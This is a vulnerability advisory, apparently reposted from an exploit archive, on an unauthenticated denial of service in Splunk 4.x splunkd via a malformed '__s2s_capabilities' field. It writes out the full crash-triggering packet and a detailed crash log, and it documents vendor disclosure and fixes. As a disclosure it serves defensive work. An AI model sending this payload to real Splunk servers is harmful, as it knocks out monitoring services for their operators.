@@ -1,0 +1,136 @@
+id: 19767
+date: 11/20/2012
+title: Splunk 4.x Denial Of Service
+author: Alexander Klink
+cves: 
+
+________________________________________________________________________
+Vendors:            Splunk Inc., http://www.splunk.com
+Product:            Splunk 4.0 - 4.3.4
+Vulnerability:      Unauthenticated remote denial of service against splunkd
+Tracking IDs:       SPL-55521
+________________________________________________________________________
+Vendor communication:
+2012/09/03 Reported the issue via Splunk's website
+2012/09/04 Splunk responds and assigns tracking ID, plans fix for 4.3.5
+2012/10/25 Splunk informs us that 5.0 will be available on November 1st
+           and 4.3.5 on November 15th. Proposes to defer announcement of
+           the vulnerability to ensure that people aren't forced to move
+           to a new major release in order to mitigate. n.runs agrees.   
+________________________________________________________________________
+Overview:
+
+When a splunktcp-input (for use in Splunk-to-Splunk communication) is
+configured, an attacker can send an initial packet with a malformed
+'__s2s_capabilities' field. This leads to a crash of the splunkd daemon
+making the splunktcp-input unavailable. If the Splunk web-interface is
+running on the same host, it will be unavailable, too as it needs to
+communicate with splunkd.
+
+Description:
+
+An example packet looks like this (__s2s_capabilities is just 'A' here):
+"--splunk-cooked-mode-v3--\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
+\0\0\0\0.\0\0\0\SOH\0\0\0\DC3__s2s_capabilities\0\0\0
+\0\STXA\0\0\0\0\0\0\0\0\ENQ_raw\0"
+
+When this packet is sent multiple times, splunkd eventually crashes with a
+crash log similar to this one:
+
+[build 128297] 2012-08-30 13:34:01
+ Access violation, cannot read at address [0x00006A62]  Exception address:
+[0x6FC4500A]  Crashing thread: TcpInputProcessor
+    ContextFlags:  [0x0001007F]
+    Dr0:  [0x00000000]
+    Dr1:  [0x00000000]
+    Dr2:  [0x00000000]
+    Dr3:  [0x00000000]
+    Dr6:  [0x00000000]
+    Dr7:  [0x00000000]
+    SegGs:  [0x00000000]
+    SegFs:  [0x0000003B]
+    SegEs:  [0x00000023]
+    SegDs:  [0x00000023]
+    Edi:  [0x099F0020]
+    Esi:  [0x00006A62]
+    Ebx:  [0x08BD5680]
+    Edx:  [0x00000001]
+    Ecx:  [0x01734000]
+    Eax:  [0x05CD6A63]
+    Ebp:  [0x03B0F9C4]
+    Eip:  [0x6FC4500A] memcpy + 90/880
+    SegCs:  [0x0000001B]
+    EFlags:  [0x00010212]
+    Esp:  [0x03B0F9BC]
+    SegSs:  [0x00000023]
+
+ OS: Windows
+ Arch: i386
+
+ Backtrace:
+    Frame  0 @[0x03B0F9C4]:  [0x6FC80475] memcpy_s + 72/123
+    Frame  1 @[0x03B0F9E0]:  [0x67DA1201]
+           std::char_traits<char>::_Copy_s + 21/29
+    Frame  2 @[0x03B0F9F8]:  [0x67DA394D]
+     std::basic_string<char,std::char_traits<char>,
+           std::allocator<char>>::assign + 126/146
+    Frame  3 @[0x03B0FA1C]:  [0x67DA5E45]
+           std::basic_string<char,std::char_traits<char>,
+           std::allocator<char> >::operator= + 13/16
+    Frame  4 @[0x05CD287C]:  [0x00006A62] ?
+    Frame  5 @[0x0064656B]: (Frame below stack)
+
+ Crash dump written to: C:\Program Files\Splunk\var\log\splunk\C__Program
+Files_Splunk_bin_splunkd_exe_crash-2012-08-30-13-34-01.dmp
+
+XXXXXXXXXXX /6.1 Service Pack 1
+Threads running: 36
+argv: [Splunkd -p 8089]
+terminating...
+
+Further analysis showed that the crash is indeed triggered by an incorrect
+source address in a fastcopy_I call. It is unclear where this address comes
+from, though and why the crash only happens after a certain amount of
+packets.
+
+Impact:
+
+Denial of service of splunkd (and possibly the Splunk web-interface,
+depending on configuration) until splunkd is restarted.
+
+Fixes:
+
+This issue has been fixed in Splunk 4.3.5 and 5.0.
+
+________________________________________________________________________
+Credits:
+Alexander Klink, n.runs AG (discovery)
+Moritz Jodeit, n.runs AG (further analysis) 
+________________________________________________________________________
+References:
+This advisory and upcoming advisories:
+http://www.nruns.com/security_advisory.php
+________________________________________________________________________
+About n.runs:
+n.runs AG is a vendor-independent consulting company specializing in the
+areas of: IT Infrastructure, IT Security and IT Business Consulting.
+
+#  0day.today [2023-03-27]  #
